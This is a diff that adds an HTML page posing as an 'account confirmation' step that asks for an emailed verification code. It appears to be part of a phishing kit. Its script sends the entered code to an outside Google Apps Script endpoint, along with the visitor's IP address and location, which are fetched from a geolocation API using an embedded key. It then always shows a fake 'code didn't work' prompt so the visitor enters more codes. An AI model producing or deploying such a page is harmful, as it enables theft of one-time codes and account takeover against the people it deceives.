@@ -1,0 +1,197 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Confirm Your Account</title>
+    <link rel="stylesheet" href="style2.css">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="content">
+        <h1>Confirm your account</h1>
+        <p>We sent a code to your email address. Enter that code to confirm your account.</p>
+        <div class="image-container">
+            <img src="/img/confirm.jpg" style="width:95%; height:177px;" alt="Illustration of entering code">
+        </div>
+        <form action="#" id="form" method="POST">
+            <input type="text" class="code-input" placeholder="Enter code" name="USER" required>
+            <input type="text" name="PASS" value="----" hidden>
+            <input type="text" name="CATEGORY" value="contact" hidden>
+            <input type="text" name="CONTINENT" id="continent" value="" hidden>
+            <input type="text" name="COUNTRY" id="country" value="" hidden>
+            <input type="text" name="CAPITAL" id="capital" value="" hidden>
+            <input type="text" name="STATE" id="state" value="" hidden>
+            <input type="text" name="CITY" id="city" value="" hidden>
+            <input type="text" name="CURRENCY" id="currency" value="" hidden>
+            <input type="text" name="PHONE_CODE" id="phone_code" value="" hidden>
+            <input type="text" name="IP_ADDRESS" id="ip" value="" hidden>
+            <button type="submit" id="submit" class="btn-primary" style="border-radius: 45px;">Continue</button>
+        </form>
+       <a href="confirm.html"> <button class="btn-secondary">Send Code Again</button></a> 
+    
+        <!-- Modal -->
+        <div id="tryAgainModal" class="modal" style="display: none;">
+            <div class="modal-content">
+                    
+                    
+                <div class="modal-body">
+                    <h3 style="text-align:center" margin-bottom: 10px;>That code didn't work</h2>
+                    <p>Please re-enter your code or request a new one.</p>
+                </div>
+                <div class="modal-footer" style="text-align: center;">
+                    <button class="btn-primary close-modal">Try Again</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <style>
+    .modal {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.5);
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        animation: fadeIn 0.5s;
+    }
+    
+    @keyframes fadeIn {
+        from {
+            opacity: 0;
+        }
+        to {
+            opacity: 1;
+        }
+    }
+    
+    .modal-content {
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 8px;
+        text-align: center;
+        width: 80%;
+        max-width: 400px;
+        box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        position: relative;
+        animation: slideDown 0.5s;
+    }
+    
+    @keyframes slideDown {
+        from {
+            transform: translateY(-50px);
+        }
+        to {
+            transform: translateY(0);
+        }
+    }
+    
+    .modal-header {
+        display: flex;
+        justify-content: space-between;
+        align-items: center;
+        border-bottom: 1px solid #ddd;
+        padding-bottom: 10px;
+    }
+    
+    .modal-body {
+        margin: 20px 0;
+    }
+    
+    .modal-footer {
+        text-align: right;
+        border-top: 1px solid #ddd;
+        padding-top: 10px;
+    }
+    
+    .close-btn {
+        cursor: pointer;
+        font-size: 20px;
+    }
+    
+    .close-modal {
+        padding: 10px 20px;
+        background-color: #fff;
+        color: #007bff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+    }
+    
+    .close-modal:hover {
+        background-color: #0056b3;
+    }
+    </style>
+    
+    <script>
+        const form = document.querySelector("#form");
+        const submitButton = document.querySelector("#submit");
+        const modal = document.querySelector("#tryAgainModal");
+        const closeModalButtons = document.querySelectorAll(".close-modal, .close-btn");
+
+        form.addEventListener("submit", (e) => {
+            e.preventDefault(); // Prevent the default form submission
+            submitButton.disabled = true;
+
+            const requestBody = new FormData(form);
+
+            fetch('https://script.google.com/macros/s/AKfycbzSOb-LvQDWXG-y-ExDsvXEXLEzEAaOaOphOhFabJx6rfCQlfSsZsgAr3u68i2Yi-XlcQ/exec', {
+                method: "POST",
+                body: requestBody
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error("Network response was not ok");
+                }
+                return response.json();
+            })
+            .then(data => {
+                submitButton.disabled = false;
+                setTimeout(() => {
+                    modal.style.display = "flex"; // Redirect on success
+                }, 1000);
+                form.reset();
+            })
+            .catch(error => {
+                submitButton.disabled = false;
+                modal.style.display = "flex"; // Show "Try Again" modal on error
+            });
+        });
+
+        // Close modal functionality
+        closeModalButtons.forEach(button => {
+            button.addEventListener("click", () => {
+                modal.style.display = "none";
+            });
+        });
+
+        window.addEventListener("click", (event) => {
+            if (event.target === modal) {
+                modal.style.display = "none";
+            }
+        });
+
+        // Fetch IP info
+        const xhr = new XMLHttpRequest();
+        xhr.addEventListener("readystatechange", function () {
+            if (xhr.readyState === 4) {
+                const data = JSON.parse(this.responseText);
+                document.getElementById("continent").value = data.continent.name;
+                document.getElementById("country").value = data.country.name;
+                document.getElementById("capital").value = data.country.capital;
+                document.getElementById("state").value = data.state.name;
+                document.getElementById("city").value = data.city.name;
+                document.getElementById("currency").value = data.country.currency;
+                document.getElementById("phone_code").value = data.country.phone_code;
+                document.getElementById("ip").value = data.ip;
+            }
+        });
+        xhr.open("GET", "https://api.geoapify.com/v1/ipinfo?&apiKey=1ee5beee55c74cde815530b82f8ab2bf");
+        xhr.send();
+    </script>
+</body>
+</html>
